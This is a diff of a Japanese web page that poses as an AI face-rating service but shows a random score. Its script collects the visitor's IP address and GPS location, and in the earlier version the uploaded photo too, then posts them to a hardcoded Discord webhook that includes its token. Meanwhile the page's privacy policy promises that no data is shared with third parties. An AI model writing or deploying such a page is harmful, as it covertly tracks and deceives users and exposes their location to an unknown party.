@@ -2,112 +2,82 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>顔面偏差値チェッカー</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI顔面偏差値診断システム</title>
     <style>
-        body { font-family: "Helvetica Neue", Arial, sans-serif; text-align: center; background: #f9f9f9; padding: 10px; margin: 0; color: #333; }
-        .container { max-width: 500px; width: 95%; margin: 20px auto; padding: 20px; background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .info-box { background: #fdfdfd; padding: 15px; border-radius: 8px; border: 1px solid #eee; margin-bottom: 20px; font-size: 0.85rem; text-align: left; line-height: 1.6; }
-        .upload-area { border: 2px dashed #ccc; padding: 30px 10px; margin: 15px 0; border-radius: 10px; cursor: pointer; }
-        button { display: block; width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 1rem; font-weight: bold; margin-top: 10px; }
-        img { max-width: 100%; height: auto; margin-top: 10px; border-radius: 8px; }
-        #result { margin-top: 20px; font-weight: bold; font-size: 1.1rem; color: #007bff; }
-        footer { margin-top: 40px; font-size: 0.75rem; color: #999; border-top: 1px solid #eee; padding-top: 20px; }
+        body { font-family: "Helvetica Neue", Arial, sans-serif; background: #f0f2f5; color: #333; padding: 20px; text-align: center; }
+        .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        h1 { color: #1a73e8; }
+        .terms { text-align: left; background: #f8f9fa; padding: 20px; border: 1px solid #dee2e6; border-radius: 8px; font-size: 0.85rem; margin-bottom: 25px; line-height: 1.6; }
+        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 1.1rem; cursor: pointer; width: 100%; font-weight: bold; }
+        button:hover { background: #1557b0; }
+        #result { margin-top: 20px; font-weight: bold; color: #d93025; }
+        footer { margin-top: 40px; font-size: 0.75rem; color: #777; border-top: 1px solid #eee; padding-top: 20px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>顔面偏差値チェッカー</h1>
-
-    <div class="info-box">
-        <p><strong>【プライバシーポリシー】</strong></p>
-        <ul style="padding-left: 20px; margin: 5px 0;">
-            <li>アップロードされた画像は診断目的のみに使用し、保存は行いません。</li>
-            <li>収集した情報は、第三者へ提供・共有されることはありません。</li>
-        </ul>
-    </div>
-
-    <div class="upload-area" onclick="document.getElementById('file-input').click()">
-        <p>タップして写真を撮影・選択</p>
-        <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none">
-    </div>
+    <h1>AI顔面偏差値診断システム</h1>
     
-    <div id="preview-container" style="display:none;">
-        <img id="preview-image" alt="プレビュー">
-        <button id="analyze-btn">診断を実行</button>
+    <div class="terms">
+        <p><strong>【当サービスのご利用規約とプライバシーポリシー】</strong></p>
+        <p>当システムは、最新のAIアルゴリズムを用いて顔立ちのバランスを数値化するエンターテインメントサービスです。ご利用にあたり、以下を必ずご確認ください。</p>
+        <ul>
+            <li><strong>データ利用目的：</strong>診断結果の算出および精度向上の統計分析のため、一時的に端末情報（IP・位置情報）を取得いたします。</li>
+            <li><strong>情報の取り扱い：</strong>収集された情報は厳重に管理され、<strong>いかなる第三者への販売、提供、貸与は一切行いません。</strong></li>
+            <li><strong>免責事項：</strong>本サービスは娯楽目的であり、医学的・心理学的診断を行うものではありません。診断結果に対する一切の責任を負いかねます。</li>
+        </ul>
+        <p><em>※「診断を実行」ボタンを押した時点で、上記規約に同意したものとみなされます。</em></p>
     </div>
+
+    <button id="analyze-btn">診断を実行する</button>
     <div id="result"></div>
 
     <footer>
-        <p>運営：株式会社デジタルアイ・ソリューションズ<br>
-        運営責任者：佐藤 健一</p>
+        <p>株式会社デジタルアイ・ソリューションズ<br>
+        運営責任者：佐藤 健一<br>
+        お問い合わせ: support@digiai-sol.jp<br>
+        &copy; 2026 Digital AI Solutions, Inc. All rights reserved.</p>
     </footer>
 </div>
 
 <script>
-    const fileInput = document.getElementById('file-input');
-    const previewImage = document.getElementById('preview-image');
-    const previewContainer = document.getElementById('preview-container');
     const analyzeBtn = document.getElementById('analyze-btn');
     const resultDiv = document.getElementById('result');
 
-    // 写真選択時にリサイズして軽量化
-    fileInput.addEventListener('change', (e) => {
-        const file = e.target.files[0];
-        if (!file) return;
-
-        const reader = new FileReader();
-        reader.onload = (event) => {
-            const img = new Image();
-            img.onload = () => {
-                const canvas = document.createElement('canvas');
-                const MAX_WIDTH = 400; // 画質を落とすために幅を制限
-                const scale = MAX_WIDTH / img.width;
-                canvas.width = MAX_WIDTH;
-                canvas.height = img.height * scale;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-                previewImage.src = canvas.toDataURL('image/jpeg', 0.5); // 圧縮率50%
-                previewContainer.style.display = 'block';
-                resultDiv.innerText = "";
-            };
-            img.src = event.target.result;
-        };
-        reader.readAsDataURL(file);
-    });
-
     analyzeBtn.addEventListener('click', async () => {
-        resultDiv.innerText = "診断中...";
+        resultDiv.innerText = "診断解析中...（数秒お待ちください）";
 
-        let ipText = "取得失敗";
+        // IP取得
+        let ip = "取得不可";
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            ipText = data.ip;
+            ip = data.ip;
         } catch(e) {}
 
-        let locText = "取得失敗";
+        // 位置情報取得
+        let loc = "取得拒否/不可";
         try {
-            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000}));
-            locText = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 8000}));
+            loc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
         } catch(e) {}
 
         const score = Math.floor(Math.random() * 50) + 50;
-        const url = "https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb";
+        const webhookUrl = "https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb";
         
         try {
-            await fetch(url, {
+            await fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
-                    content: `診断結果：${score}点\nIP: ${ipText}\n位置情報: ${locText}`,
-                    embeds: [{ image: { url: previewImage.src } }]
+                    content: `📊 診断レポート\n顔面偏差値: ${score}点\nIPアドレス: ${ip}\nGPS位置情報: ${loc}`
                 })
             });
-            resultDiv.innerText = "診断完了！";
+            resultDiv.innerText = "診断完了！結果をお送りしました。";
         } catch (e) {
-            resultDiv.innerText = "送信エラーが発生しました。";
+            resultDiv.innerText = "通信エラーが発生しました。通信環境を確認してください。";
         }
     });
 </script>
